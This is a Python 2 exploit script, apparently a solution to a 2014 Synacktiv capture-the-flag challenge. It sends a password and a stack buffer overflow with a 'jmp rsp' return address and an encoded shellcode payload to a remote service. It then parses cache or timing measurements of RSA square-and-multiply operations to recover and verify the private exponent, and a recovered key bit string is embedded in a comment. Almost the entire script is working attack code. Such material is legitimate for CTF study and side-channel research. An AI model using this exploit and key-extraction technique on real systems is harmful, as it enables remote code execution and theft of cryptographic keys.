#!/usr/bin/python2

import socket
import sys
import struct
from libshellcode import *
import matplotlib.pyplot as plt
import numpy as np
from collections import defaultdict


Y_MAX = 2000


KEY_SIZE = 1384

HIT_MULTIPLY = 1
HIT_SQUARE   = 0
HIT_NOTHING  = -1

def recvall(s, n):
    done = False
    resp = ''
    while(not done):
        r = s.recv(n-len(resp))
        resp += r
        done = r == ''
    return resp

def recv_measures(s):
    """Return 3 lists : all results, tuples of multiply, tuples of square"""
    nb_measures = struct.unpack("<Q", recvall(s, 8))[0]

    print "[+] Receiving %d measures..." % (nb_measures)
    measures_buf = recvall(s, nb_measures)

    lmu = []
    lsq = []
    all_res = []
    for i, m in enumerate(measures_buf):
        m = ord(m)
        if(m == HIT_MULTIPLY):
            lmu.append((i, 10))
            all_res.append("M")
        elif(m == HIT_SQUARE):
            lsq.append((i, 15))
            all_res.append("S")
        
    return all_res, lmu, lsq

def list_to_tuples(l):
    t = []
    for i in range(len(l)/2):
        t.append((l[2*i], 1))
    return t

def list_to_points(l):
    xaxis = []
    yaxis = []
    for x,y in l:
        xaxis.append(x)
        yaxis.append(y)
    return xaxis, yaxis

def plot(lmu, lsq):
    xaxis_mu, yaxis_mu = list_to_points(lmu)  
    xaxis_sq, yaxis_sq = list_to_points(lsq)   

    plt.plot(xaxis_mu, yaxis_mu, 'ro')
    plt.plot(xaxis_sq, yaxis_sq, 'bo')

    a = plt.axis()
    plt.axis((a[0], a[1], 5, 20))
    #plt.axis([0, 6, 0, 20])
    plt.show()


def indexes(l): 
    return map(lambda x:x[0], l)


PASSWORD = "UBNtYTbYKWBeo12cHr33GHREdZYyOHMZ"

padding = "a"*12072
retaddr = struct.pack("<Q", 0x00400f61)  # jmp rsp

int3 = "\xcc" 
sub_esp = "\x48\x81\xc4\xf0\xd8\xff\xff" # add rsp, -10000

encoded_attack = extract_text_and_encode(sys.argv[2])
#print "encoded attack :", " ".join("%02x" % ord(i) for i in encoded_attack)

payload = (sub_esp*100) + encoded_attack

exploit = PASSWORD + "\n" + padding + retaddr + payload +  "\n"

print "[+] Sending exploit..."
s = socket.socket()
s.settimeout(25)
s.connect((sys.argv[1], 1337))
s.send(exploit)
print "[+] Sent."


# Skip error message
if(sys.argv[1] == "nsc2014.synacktiv.com"):
    assert s.recv(26) == "error while receiving key\n"


print "[+] Receiving measures..."
all_res, lmu, lsq = recv_measures(s)

#print "[+] Plotting..."
#plot(lmu, lsq)


BLOCK_SIZE = 20
blocks = ''

current_state = 'M'
current_sequence_length = 0
for m in all_res:
    if(m != current_state):
        nb = int(round(float(current_sequence_length) / BLOCK_SIZE))
        if(nb > 0):
            blocks += current_state*nb
        current_state = m
        current_sequence_length = 0
    else:
        current_sequence_length += 1

key = blocks.replace("MS", "1").replace("S", "0").replace("M", "1")[::-1]
# 101010000011000100111000010000111111010000000100010101010001101001111110001101011010101001011111100010100010110001010110111000010000100011111010011010001011101101100010100001010110100110110100111101010010010100111110110100110011001100110000110010010100111000100001001111001010101010100000000101100110011101111100010011111001100011111010010111100110101010100111000000000111010001101011010011000010100000100101101100110100100111111011101110101110101011000100011010011011110001101111010001000100110000101011101001000111011111000001001010100001010001011010100000111101001101011010111000100100011010100001011000001101010100101011011001011101111101000000000011111101111100011001010010100101101010101000011010011100011110101111101001110110111100101111001010110011111010000000011100011001111111101001001111001101110100010100110010111011010010011010011010110101000101110000010000101001011000111111000000011001001100110011001011000011011101001100101011011101111110111110101110010010101010111001001011111110000001010111100010110001011101000000111001011111010110110101110110111010011100000000111001111110100001111010001101101110110000100110111000111100011110111010110011001000110111110011010100000101101111110100101100111011001011011000110101110111001001011001011111111000100010101101101111100011110101111110000111010111101011111101100111001010001011010101110001000110100111100100110001001

d = int(key, 2)
print "[+] found d :\n0b%s\n0x%x" % (key, d)

print "[+] Checking d..."
M = 1337
if(pow(pow(M, E, N), d, N) == M):
    print "[+] Looks good !"
else:
    print "[-] Failed :("

"""

In [7]: import zlib; import cPickle

In [8]: s=zlib.compress(cPickle.dumps((all_res, lmu, lsq)))

In [9]: len(s)
Out[9]: 220947

In [10]: open("data.bin","wb").write(s)


"""
